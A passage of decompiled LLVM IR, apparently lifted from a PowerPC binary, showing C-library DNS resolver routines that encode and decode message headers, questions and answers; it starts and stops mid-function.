  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100148d8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100148c0, { 1, 0 }
  uselistorder label %dec_label_pc_10014888, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001485c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10014838, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10014790, { 1, 0 }
  uselistorder label %dec_label_pc_10014784, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014768, { 1, 0 }
  uselistorder label %dec_label_pc_10014748, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10014744, { 1, 0 }
  uselistorder label %dec_label_pc_100146fc, { 1, 0 }
  uselistorder label %dec_label_pc_100146b4, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* @r7, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_100149d4, label %dec_label_pc_100148fc

dec_label_pc_100148fc:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_100148fc = add i32 %tmp, 2
  %v2_100148fc = inttoptr i32 %v1_100148fc to i8*
  %v3_100148fc = load i8, i8* %v2_100148fc, align 1
  %v4_100148fc = zext i8 %v3_100148fc to i32
  store i32 %v4_100148fc, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r7, align 4
  store i8 %v3_100148fc, i8* %tmp3, align 1
  %v2_10014908 = load i32, i32* %arg1, align 4
  store i32 %v2_10014908, i32* %r0.global-to-local, align 4
  %v1_1001490c = trunc i32 %v2_10014908 to i8
  %v4_1001490c = add i32 %arg2, 1
  %v5_1001490c = inttoptr i32 %v4_1001490c to i8*
  store i8 %v1_1001490c, i8* %v5_1001490c, align 1
  %v1_10014910 = add i32 %tmp, 12
  %v2_10014910 = inttoptr i32 %v1_10014910 to i32*
  %v3_10014910 = load i32, i32* %v2_10014910, align 4
  store i32 %v3_10014910, i32* %r0.global-to-local, align 4
  %v1_10014914 = add i32 %tmp, 16
  %v2_10014914 = inttoptr i32 %v1_10014914 to i32*
  %v3_10014914 = load i32, i32* %v2_10014914, align 4
  store i32 %v3_10014914, i32* %r11.global-to-local, align 4
  %v1_10014918 = add i32 %tmp, 4
  %v2_10014918 = inttoptr i32 %v1_10014918 to i32*
  %v3_10014918 = load i32, i32* %v2_10014918, align 4
  %v2_1001491c = icmp ne i32 %v3_10014910, 0
  %v5_10014920 = zext i1 %v2_1001491c to i32
  store i32 %v5_10014920, i32* %r10.global-to-local, align 4
  %v1_10014924 = add i32 %tmp, 8
  %v2_10014924 = inttoptr i32 %v1_10014924 to i32*
  %v3_10014924 = load i32, i32* %v2_10014924, align 4
  %v2_10014928 = icmp ne i32 %v3_10014914, 0
  %v5_1001492c = zext i1 %v2_10014928 to i32
  %v1_10014930 = add i32 %tmp, 20
  %v2_10014930 = inttoptr i32 %v1_10014930 to i32*
  %v3_10014930 = load i32, i32* %v2_10014930, align 4
  store i32 %v3_10014930, i32* %r0.global-to-local, align 4
  %not.v2_10014934 = icmp eq i32 %v3_10014918, 0
  %v6_10014938 = sext i1 %not.v2_10014934 to i32
  store i32 %v5_1001492c, i32* %r11.global-to-local, align 4
  %v1_10014940 = call i32 @__asm_rlwinm(i32 %v6_10014938, i32 0, i32 24, i32 24)
  %v0_10014944 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014944 = mul i32 %v0_10014944, 4
  store i32 %v1_10014944, i32* %r10.global-to-local, align 4
  %v1_10014948 = call i32 @__asm_rlwinm(i32 %v3_10014924, i32 3, i32 25, i32 28)
  store i32 %v1_10014948, i32* @r8, align 4
  %v0_1001494c = load i32, i32* %r0.global-to-local, align 4
  %v2_1001494c = icmp ne i32 %v0_1001494c, 0
  %v5_10014950 = zext i1 %v2_1001494c to i32
  %v2_10014954 = or i32 %v1_10014944, %v1_10014948
  store i32 %v2_10014954, i32* @r10, align 4
  %v1_10014958 = add i32 %v1_10014940, 128
  %v0_1001495c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001495c = mul i32 %v0_1001495c, 2
  store i32 %v1_1001495c, i32* %r11.global-to-local, align 4
  %v2_10014960 = or i32 %v2_10014954, %v5_10014950
  store i32 %v2_10014960, i32* %r0.global-to-local, align 4
  %v2_10014964 = or i32 %v2_10014960, %v1_10014958
  %v2_10014968 = or i32 %v2_10014964, %v1_1001495c
  %v1_1001496c = trunc i32 %v2_10014968 to i8
  %v4_1001496c = add i32 %arg2, 2
  %v5_1001496c = inttoptr i32 %v4_1001496c to i8*
  store i8 %v1_1001496c, i8* %v5_1001496c, align 1
  %v1_10014970 = add i32 %tmp, 24
  %v2_10014970 = inttoptr i32 %v1_10014970 to i32*
  %v3_10014970 = load i32, i32* %v2_10014970, align 4
  %v1_10014974 = add i32 %tmp, 28
  %v2_10014974 = inttoptr i32 %v1_10014974 to i32*
  %v3_10014974 = load i32, i32* %v2_10014974, align 4
  store i32 %v3_10014974, i32* %r0.global-to-local, align 4
  %not.v2_10014978 = icmp eq i32 %v3_10014970, 0
  %v6_1001497c = sext i1 %not.v2_10014978 to i32
  %v1_10014980 = call i32 @__asm_rlwinm(i32 %v6_1001497c, i32 0, i32 24, i32 24)
  %v1_10014984 = urem i32 %v3_10014974, 16
  store i32 %v1_10014984, i32* %r0.global-to-local, align 4
  %v1_10014988 = add i32 %v1_10014980, 128
  %v2_1001498c = or i32 %v1_10014984, %v1_10014988
  %v1_10014990 = trunc i32 %v2_1001498c to i8
  %v4_10014990 = add i32 %arg2, 3
  %v5_10014990 = inttoptr i32 %v4_10014990 to i8*
  store i8 %v1_10014990, i8* %v5_10014990, align 1
  %v1_10014994 = add i32 %tmp, 34
  %v2_10014994 = inttoptr i32 %v1_10014994 to i8*
  %v3_10014994 = load i8, i8* %v2_10014994, align 1
  %v4_10014994 = zext i8 %v3_10014994 to i32
  store i32 %v4_10014994, i32* %r0.global-to-local, align 4
  %v4_10014998 = add i32 %arg2, 4
  %v5_10014998 = inttoptr i32 %v4_10014998 to i8*
  store i8 %v3_10014994, i8* %v5_10014998, align 1
  %v1_1001499c = add i32 %tmp, 32
  %v2_1001499c = inttoptr i32 %v1_1001499c to i32*
  %v3_1001499c = load i32, i32* %v2_1001499c, align 4
  store i32 %v3_1001499c, i32* %r0.global-to-local, align 4
  %v1_100149a0 = trunc i32 %v3_1001499c to i8
  %v4_100149a0 = add i32 %arg2, 5
  %v5_100149a0 = inttoptr i32 %v4_100149a0 to i8*
  store i8 %v1_100149a0, i8* %v5_100149a0, align 1
  %v1_100149a4 = add i32 %tmp, 38
  %v2_100149a4 = inttoptr i32 %v1_100149a4 to i8*
  %v3_100149a4 = load i8, i8* %v2_100149a4, align 1
  %v4_100149a4 = zext i8 %v3_100149a4 to i32
  store i32 %v4_100149a4, i32* %r0.global-to-local, align 4
  %v4_100149a8 = add i32 %arg2, 6
  %v5_100149a8 = inttoptr i32 %v4_100149a8 to i8*
  store i8 %v3_100149a4, i8* %v5_100149a8, align 1
  %v1_100149ac = add i32 %tmp, 36
  %v2_100149ac = inttoptr i32 %v1_100149ac to i32*
  %v3_100149ac = load i32, i32* %v2_100149ac, align 4
  store i32 %v3_100149ac, i32* %r0.global-to-local, align 4
  %v1_100149b0 = trunc i32 %v3_100149ac to i8
  %v4_100149b0 = add i32 %arg2, 7
  %v5_100149b0 = inttoptr i32 %v4_100149b0 to i8*
  store i8 %v1_100149b0, i8* %v5_100149b0, align 1
  %v1_100149b4 = add i32 %tmp, 42
  %v2_100149b4 = inttoptr i32 %v1_100149b4 to i8*
  %v3_100149b4 = load i8, i8* %v2_100149b4, align 1
  %v4_100149b4 = zext i8 %v3_100149b4 to i32
  store i32 %v4_100149b4, i32* %r0.global-to-local, align 4
  %v4_100149b8 = add i32 %arg2, 8
  %v5_100149b8 = inttoptr i32 %v4_100149b8 to i8*
  store i8 %v3_100149b4, i8* %v5_100149b8, align 1
  %v1_100149bc = add i32 %tmp, 40
  %v2_100149bc = inttoptr i32 %v1_100149bc to i32*
  %v3_100149bc = load i32, i32* %v2_100149bc, align 4
  store i32 %v3_100149bc, i32* %r0.global-to-local, align 4
  %v1_100149c0 = trunc i32 %v3_100149bc to i8
  %v4_100149c0 = add i32 %arg2, 9
  %v5_100149c0 = inttoptr i32 %v4_100149c0 to i8*
  store i8 %v1_100149c0, i8* %v5_100149c0, align 1
  %v1_100149c4 = add i32 %tmp, 46
  %v2_100149c4 = inttoptr i32 %v1_100149c4 to i8*
  %v3_100149c4 = load i8, i8* %v2_100149c4, align 1
  %v4_100149c4 = zext i8 %v3_100149c4 to i32
  store i32 %v4_100149c4, i32* %r0.global-to-local, align 4
  %v4_100149c8 = add i32 %arg2, 10
  %v5_100149c8 = inttoptr i32 %v4_100149c8 to i8*
  store i8 %v3_100149c4, i8* %v5_100149c8, align 1
  %v1_100149cc = add i32 %tmp, 44
  %v2_100149cc = inttoptr i32 %v1_100149cc to i32*
  %v3_100149cc = load i32, i32* %v2_100149cc, align 4
  store i32 %v3_100149cc, i32* %r0.global-to-local, align 4
  %v1_100149d0 = trunc i32 %v3_100149cc to i8
  %v4_100149d0 = add i32 %arg2, 11
  %v5_100149d0 = inttoptr i32 %v4_100149d0 to i8*
  store i8 %v1_100149d0, i8* %v5_100149d0, align 1
  %v0_100149d4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_100149d4

dec_label_pc_100149d4:                            ; preds = %entry, %dec_label_pc_100148fc
  %v0_100149d4 = phi i32 [ -1, %entry ], [ %v0_100149d4.pre, %dec_label_pc_100148fc ]
  ret i32 %v0_100149d4

; uselistorder directives
  uselistorder i32 %v1_10014984, { 1, 0 }
  uselistorder i32 %v1_1001495c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 38, { 6, 7, 2, 3, 4, 5, 0, 1 }
  uselistorder label %dec_label_pc_100149d4, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100149dc = load i8, i8* %arg1, align 1
  %v4_100149dc = zext i8 %v3_100149dc to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_100149e4 = add i32 %tmp, 1
  %v3_100149e4 = inttoptr i32 %v2_100149e4 to i8*
  %v4_100149e4 = load i8, i8* %v3_100149e4, align 1
  %v5_100149e4 = zext i8 %v4_100149e4 to i32
  %v1_100149ec = mul nuw nsw i32 %v4_100149dc, 256
  %v2_100149f0 = or i32 %v5_100149e4, %v1_100149ec
  %v2_100149f4 = inttoptr i32 %arg2 to i32*
  store i32 %v2_100149f0, i32* %v2_100149f4, align 4
  %v0_100149f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100149f8 = add i32 %v0_100149f8, 2
  %v2_100149f8 = inttoptr i32 %v1_100149f8 to i8*
  %v3_100149f8 = load i8, i8* %v2_100149f8, align 1
  %v4_100149f8 = zext i8 %v3_100149f8 to i32
  %v1_100149fc = call i32 @__asm_rlwinm(i32 %v4_100149f8, i32 25, i32 31, i32 31)
  %v2_10014a00 = add i32 %arg2, 4
  %v3_10014a00 = inttoptr i32 %v2_10014a00 to i32*
  store i32 %v1_100149fc, i32* %v3_10014a00, align 4
  %v0_10014a04 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a04 = add i32 %v0_10014a04, 2
  %v2_10014a04 = inttoptr i32 %v1_10014a04 to i8*
  %v3_10014a04 = load i8, i8* %v2_10014a04, align 1
  %v4_10014a04 = zext i8 %v3_10014a04 to i32
  %v1_10014a08 = call i32 @__asm_rlwinm(i32 %v4_10014a04, i32 29, i32 28, i32 31)
  %v2_10014a0c = add i32 %arg2, 8
  %v3_10014a0c = inttoptr i32 %v2_10014a0c to i32*
  store i32 %v1_10014a08, i32* %v3_10014a0c, align 4
  %v0_10014a10 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a10 = add i32 %v0_10014a10, 2
  %v2_10014a10 = inttoptr i32 %v1_10014a10 to i8*
  %v3_10014a10 = load i8, i8* %v2_10014a10, align 1
  %v4_10014a10 = zext i8 %v3_10014a10 to i32
  %v1_10014a14 = call i32 @__asm_rlwinm(i32 %v4_10014a10, i32 30, i32 31, i32 31)
  %v2_10014a18 = add i32 %arg2, 12
  %v3_10014a18 = inttoptr i32 %v2_10014a18 to i32*
  store i32 %v1_10014a14, i32* %v3_10014a18, align 4
  %v0_10014a1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a1c = add i32 %v0_10014a1c, 2
  %v2_10014a1c = inttoptr i32 %v1_10014a1c to i8*
  %v3_10014a1c = load i8, i8* %v2_10014a1c, align 1
  %v4_10014a1c = zext i8 %v3_10014a1c to i32
  %v1_10014a20 = call i32 @__asm_rlwinm(i32 %v4_10014a1c, i32 31, i32 31, i32 31)
  %v2_10014a24 = add i32 %arg2, 16
  %v3_10014a24 = inttoptr i32 %v2_10014a24 to i32*
  store i32 %v1_10014a20, i32* %v3_10014a24, align 4
  %v0_10014a28 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a28 = add i32 %v0_10014a28, 2
  %v2_10014a28 = inttoptr i32 %v1_10014a28 to i8*
  %v3_10014a28 = load i8, i8* %v2_10014a28, align 1
  %tmp1 = urem i8 %v3_10014a28, 2
  %v1_10014a2c = zext i8 %tmp1 to i32
  %v2_10014a30 = add i32 %arg2, 20
  %v3_10014a30 = inttoptr i32 %v2_10014a30 to i32*
  store i32 %v1_10014a2c, i32* %v3_10014a30, align 4
  %v0_10014a34 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a34 = add i32 %v0_10014a34, 3
  %v2_10014a34 = inttoptr i32 %v1_10014a34 to i8*
  %v3_10014a34 = load i8, i8* %v2_10014a34, align 1
  %v4_10014a34 = zext i8 %v3_10014a34 to i32
  %v1_10014a38 = call i32 @__asm_rlwinm(i32 %v4_10014a34, i32 25, i32 31, i32 31)
  %v2_10014a3c = add i32 %arg2, 24
  %v3_10014a3c = inttoptr i32 %v2_10014a3c to i32*
  store i32 %v1_10014a38, i32* %v3_10014a3c, align 4
  %v0_10014a40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a40 = add i32 %v0_10014a40, 3
  %v2_10014a40 = inttoptr i32 %v1_10014a40 to i8*
  %v3_10014a40 = load i8, i8* %v2_10014a40, align 1
  %tmp2 = urem i8 %v3_10014a40, 16
  %v1_10014a44 = zext i8 %tmp2 to i32
  %v2_10014a48 = add i32 %arg2, 28
  %v3_10014a48 = inttoptr i32 %v2_10014a48 to i32*
  store i32 %v1_10014a44, i32* %v3_10014a48, align 4
  %v0_10014a4c = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a4c = add i32 %v0_10014a4c, 4
  %v2_10014a4c = inttoptr i32 %v1_10014a4c to i8*
  %v3_10014a4c = load i8, i8* %v2_10014a4c, align 1
  %v4_10014a4c = zext i8 %v3_10014a4c to i32
  %v1_10014a50 = add i32 %v0_10014a4c, 5
  %v2_10014a50 = inttoptr i32 %v1_10014a50 to i8*
  %v3_10014a50 = load i8, i8* %v2_10014a50, align 1
  %v4_10014a50 = zext i8 %v3_10014a50 to i32
  %v1_10014a54 = mul nuw nsw i32 %v4_10014a4c, 256
  %v2_10014a58 = or i32 %v4_10014a50, %v1_10014a54
  %v2_10014a5c = add i32 %arg2, 32
  %v3_10014a5c = inttoptr i32 %v2_10014a5c to i32*
  store i32 %v2_10014a58, i32* %v3_10014a5c, align 4
  %v0_10014a60 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a60 = add i32 %v0_10014a60, 6
  %v2_10014a60 = inttoptr i32 %v1_10014a60 to i8*
  %v3_10014a60 = load i8, i8* %v2_10014a60, align 1
  %v4_10014a60 = zext i8 %v3_10014a60 to i32
  %v1_10014a64 = add i32 %v0_10014a60, 7
  %v2_10014a64 = inttoptr i32 %v1_10014a64 to i8*
  %v3_10014a64 = load i8, i8* %v2_10014a64, align 1
  %v4_10014a64 = zext i8 %v3_10014a64 to i32
  %v1_10014a68 = mul nuw nsw i32 %v4_10014a60, 256
  %v2_10014a6c = or i32 %v4_10014a64, %v1_10014a68
  %v2_10014a70 = add i32 %arg2, 36
  %v3_10014a70 = inttoptr i32 %v2_10014a70 to i32*
  store i32 %v2_10014a6c, i32* %v3_10014a70, align 4
  %v0_10014a74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a74 = add i32 %v0_10014a74, 8
  %v2_10014a74 = inttoptr i32 %v1_10014a74 to i8*
  %v3_10014a74 = load i8, i8* %v2_10014a74, align 1
  %v4_10014a74 = zext i8 %v3_10014a74 to i32
  %v1_10014a78 = add i32 %v0_10014a74, 9
  %v2_10014a78 = inttoptr i32 %v1_10014a78 to i8*
  %v3_10014a78 = load i8, i8* %v2_10014a78, align 1
  %v4_10014a78 = zext i8 %v3_10014a78 to i32
  %v1_10014a7c = mul nuw nsw i32 %v4_10014a74, 256
  %v2_10014a80 = or i32 %v4_10014a78, %v1_10014a7c
  %v2_10014a84 = add i32 %arg2, 40
  %v3_10014a84 = inttoptr i32 %v2_10014a84 to i32*
  store i32 %v2_10014a80, i32* %v3_10014a84, align 4
  %v0_10014a88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a88 = add i32 %v0_10014a88, 10
  %v2_10014a88 = inttoptr i32 %v1_10014a88 to i8*
  %v3_10014a88 = load i8, i8* %v2_10014a88, align 1
  %v4_10014a88 = zext i8 %v3_10014a88 to i32
  %v1_10014a8c = add i32 %v0_10014a88, 11
  %v2_10014a8c = inttoptr i32 %v1_10014a8c to i8*
  %v3_10014a8c = load i8, i8* %v2_10014a8c, align 1
  %v4_10014a8c = zext i8 %v3_10014a8c to i32
  store i32 %v4_10014a8c, i32* %r9.global-to-local, align 4
  %v1_10014a90 = mul nuw nsw i32 %v4_10014a88, 256
  %v2_10014a94 = or i32 %v4_10014a8c, %v1_10014a90
  %v2_10014a98 = add i32 %arg2, 44
  %v3_10014a98 = inttoptr i32 %v2_10014a98 to i32*
  store i32 %v2_10014a94, i32* %v3_10014a98, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 12, 13, 16, 17, 18, 8, 1, 2, 3, 4, 5, 6, 7, 19, 20, 15, 0, 14, 11, 9, 10, 21, 22 }
  uselistorder i32 11, { 16, 17, 13, 14, 25, 12, 6, 18, 27, 26, 7, 19, 3, 4, 20, 21, 22, 23, 24, 5, 0, 15, 8, 9, 1, 11, 2, 10 }
  uselistorder i32 40, { 13, 14, 22, 23, 16, 6, 7, 8, 9, 4, 24, 2, 3, 15, 0, 12, 17, 18, 19, 20, 21, 11, 10, 1, 5 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 28, { 30, 31, 32, 33, 2, 3, 15, 52, 34, 53, 56, 38, 0, 39, 40, 41, 4, 5, 16, 17, 18, 19, 20, 21, 22, 10, 11, 12, 54, 55, 29, 57, 35, 36, 42, 43, 44, 45, 46, 47, 50, 48, 49, 1, 51, 60, 37, 28, 61, 62, 23, 24, 6, 7, 8, 9, 13, 14, 65, 66, 63, 64, 58, 59, 25, 26, 27 }
  uselistorder i32 29, { 22, 1, 2, 3, 4, 5, 6, 7, 8, 9, 28, 29, 25, 26, 23, 24, 27, 30, 34, 31, 35, 37, 38, 32, 33, 20, 21, 41, 42, 39, 40, 18, 19, 10, 11, 12, 13, 14, 15, 16, 36, 0, 17 }
  uselistorder i32 31, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 47, 48, 3, 4, 5, 2, 0, 28, 29, 30, 49, 50, 14, 15, 6, 7, 1, 8, 31, 32, 33, 53, 54, 51, 52, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 27, 46, 11, 12, 9, 10, 13, 16 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10014abc = load i32, i32* %arg1, align 4
  store i32 %v2_10014abc, i32* %r3.global-to-local, align 4
  store i32 268520132, i32* @lr, align 4
  %v1_10014ac0 = inttoptr i32 %v2_10014abc to i8*
  %v2_10014ac0 = call i32 @__encode_dotted(i8* %v1_10014ac0)
  store i32 %v2_10014ac0, i32* %r3.global-to-local, align 4
  %v1_10014ac4 = icmp slt i32 %v2_10014ac0, 0
  %v1_10014ac8 = load i32, i32* @r29, align 4
  %v2_10014ac8 = sub i32 %v1_10014ac8, %v2_10014ac0
  store i32 %v2_10014ac8, i32* @r29, align 4
  br i1 %v1_10014ac4, label %dec_label_pc_10014b08, label %dec_label_pc_10014ad4

dec_label_pc_10014ad4:                            ; preds = %entry
  %v2_10014acc = icmp sgt i32 %v2_10014ac8, 3
  %v0_10014ad4 = load i32, i32* @r30, align 4
  %v2_10014ad4 = add i32 %v0_10014ad4, %v2_10014ac0
  store i32 %v2_10014ad4, i32* %r9.global-to-local, align 4
  br i1 %v2_10014acc, label %dec_label_pc_10014ae4, label %dec_label_pc_10014adc

dec_label_pc_10014adc:                            ; preds = %dec_label_pc_10014ad4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014b08

dec_label_pc_10014ae4:                            ; preds = %dec_label_pc_10014ad4
  %v0_10014ae4 = load i32, i32* @r31, align 4
  %v1_10014ae4 = add i32 %v0_10014ae4, 6
  %v2_10014ae4 = inttoptr i32 %v1_10014ae4 to i8*
  %v3_10014ae4 = load i8, i8* %v2_10014ae4, align 1
  %v5_10014ae8 = inttoptr i32 %v2_10014ad4 to i8*
  store i8 %v3_10014ae4, i8* %v5_10014ae8, align 1
  %v0_10014aec = load i32, i32* %r3.global-to-local, align 4
  %v1_10014aec = add i32 %v0_10014aec, 4
  store i32 %v1_10014aec, i32* %r3.global-to-local, align 4
  %v0_10014af0 = load i32, i32* @r31, align 4
  %v1_10014af0 = add i32 %v0_10014af0, 4
  %v2_10014af0 = inttoptr i32 %v1_10014af0 to i32*
  %v3_10014af0 = load i32, i32* %v2_10014af0, align 4
  %v1_10014af4 = trunc i32 %v3_10014af0 to i8
  %v2_10014af4 = load i32, i32* %r9.global-to-local, align 4
  %v3_10014af4 = add i32 %v2_10014af4, 1
  %v4_10014af4 = inttoptr i32 %v3_10014af4 to i8*
  store i8 %v1_10014af4, i8* %v4_10014af4, align 1
  %v0_10014af8 = load i32, i32* @r31, align 4
  %v1_10014af8 = add i32 %v0_10014af8, 10
  %v2_10014af8 = inttoptr i32 %v1_10014af8 to i8*
  %v3_10014af8 = load i8, i8* %v2_10014af8, align 1
  %v2_10014afc = load i32, i32* %r9.global-to-local, align 4
  %v3_10014afc = add i32 %v2_10014afc, 2
  %v4_10014afc = inttoptr i32 %v3_10014afc to i8*
  store i8 %v3_10014af8, i8* %v4_10014afc, align 1
  %v0_10014b00 = load i32, i32* @r31, align 4
  %v1_10014b00 = add i32 %v0_10014b00, 8
  %v2_10014b00 = inttoptr i32 %v1_10014b00 to i32*
  %v3_10014b00 = load i32, i32* %v2_10014b00, align 4
  %v1_10014b04 = trunc i32 %v3_10014b00 to i8
  %v2_10014b04 = load i32, i32* %r9.global-to-local, align 4
  %v3_10014b04 = add i32 %v2_10014b04, 3
  %v4_10014b04 = inttoptr i32 %v3_10014b04 to i8*
  store i8 %v1_10014b04, i8* %v4_10014b04, align 1
  %v0_10014b18.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014b08

dec_label_pc_10014b08:                            ; preds = %entry, %dec_label_pc_10014adc, %dec_label_pc_10014ae4
  %v0_10014b18 = phi i32 [ %v2_10014ac0, %entry ], [ -1, %dec_label_pc_10014adc ], [ %v0_10014b18.pre, %dec_label_pc_10014ae4 ]
  ret i32 %v0_10014b18

; uselistorder directives
  uselistorder i32 %v2_10014ac0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder label %dec_label_pc_10014b08, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268520236, i32* @lr, align 4
  %v0_10014b28 = call i32 @__length_dotted()
  %v1_10014b2c = icmp slt i32 %v0_10014b28, 0
  br i1 %v1_10014b2c, label %dec_label_pc_10014b38, label %dec_label_pc_10014b34

dec_label_pc_10014b34:                            ; preds = %entry
  %v1_10014b34 = add i32 %v0_10014b28, 4
  br label %dec_label_pc_10014b38

dec_label_pc_10014b38:                            ; preds = %entry, %dec_label_pc_10014b34
  %v0_10014b44 = phi i32 [ %v0_10014b28, %entry ], [ %v1_10014b34, %dec_label_pc_10014b34 ]
  ret i32 %v0_10014b44

; uselistorder directives
  uselistorder label %dec_label_pc_10014b38, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10014b4c = load i32, i32* @lr, align 4
  store i32 %v0_10014b4c, i32* %r0.global-to-local, align 4
  %v2_10014b54 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10014b54, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268520312, i32* @lr, align 4
  %v2_10014b74 = call i32 @__decode_dotted(i32 %v2_10014b54, i32 256)
  store i32 %v2_10014b74, i32* @r27, align 4
  %v1_10014b78 = icmp slt i32 %v2_10014b74, 0
  %v0_10014b7c = load i32, i32* @r28, align 4
  %v2_10014b7c = add i32 %v0_10014b7c, %v2_10014b74
  store i32 %v2_10014b7c, i32* @r28, align 4
  %v1_10014b80 = load i32, i32* @r29, align 4
  %v2_10014b80 = sub i32 %v1_10014b80, %v2_10014b7c
  %v1_10014b84 = add i32 %v2_10014b80, -10
  store i32 %v1_10014b84, i32* @r29, align 4
  br i1 %v1_10014b78, label %dec_label_pc_10014c40, label %dec_label_pc_10014b90

dec_label_pc_10014b90:                            ; preds = %entry
  %v0_10014b94 = load i32, i32* @r26, align 4
  %v2_10014b94 = add i32 %v0_10014b94, %v2_10014b7c
  store i32 %v2_10014b94, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10014b84, -1
  br i1 %tmp6, label %dec_label_pc_10014ba4, label %dec_label_pc_10014b9c

dec_label_pc_10014b9c:                            ; preds = %dec_label_pc_10014b90
  store i32 %v1_10014b84, i32* @r27, align 4
  br label %dec_label_pc_10014c40

dec_label_pc_10014ba4:                            ; preds = %dec_label_pc_10014b90
  store i32 268520360, i32* @lr, align 4
  %v1_10014ba4 = call i32 @__GI_strdup(i32 %v2_10014b54)
  %v0_10014ba8 = load i32, i32* @r30, align 4
  %v1_10014ba8 = add i32 %v0_10014ba8, 2
  store i32 %v1_10014ba8, i32* @r8, align 4
  %v1_10014bac = load i32, i32* @r31, align 4
  %v2_10014bac = inttoptr i32 %v1_10014bac to i32*
  store i32 %v1_10014ba4, i32* %v2_10014bac, align 4
  %v0_10014bb0 = load i32, i32* @r8, align 4
  %v1_10014bb0 = add i32 %v0_10014bb0, 2
  store i32 %v1_10014bb0, i32* @r10, align 4
  %v0_10014bb4 = load i32, i32* @r30, align 4
  %v1_10014bb4 = add i32 %v0_10014bb4, 10
  store i32 %v1_10014bb4, i32* %r6.global-to-local, align 4
  %v0_10014bb8 = load i32, i32* @r26, align 4
  %v1_10014bb8 = load i32, i32* @r28, align 4
  %v2_10014bb8 = add i32 %v1_10014bb8, %v0_10014bb8
  %v3_10014bb8 = inttoptr i32 %v2_10014bb8 to i8*
  %v4_10014bb8 = load i8, i8* %v3_10014bb8, align 1
  %v5_10014bb8 = zext i8 %v4_10014bb8 to i32
  store i32 %v5_10014bb8, i32* %r0.global-to-local, align 4
  %v1_10014bbc = add i32 %v0_10014bb4, 1
  %v2_10014bbc = inttoptr i32 %v1_10014bbc to i8*
  %v3_10014bbc = load i8, i8* %v2_10014bbc, align 1
  %v4_10014bbc = zext i8 %v3_10014bbc to i32
  store i32 %v4_10014bbc, i32* %r9.global-to-local, align 4
  %v1_10014bc0 = mul nuw nsw i32 %v5_10014bb8, 256
  %v2_10014bc4 = or i32 %v4_10014bbc, %v1_10014bc0
  store i32 %v2_10014bc4, i32* %r0.global-to-local, align 4
  %v1_10014bc8 = load i32, i32* @r31, align 4
  %v2_10014bc8 = add i32 %v1_10014bc8, 4
  %v3_10014bc8 = inttoptr i32 %v2_10014bc8 to i32*
  store i32 %v2_10014bc4, i32* %v3_10014bc8, align 4
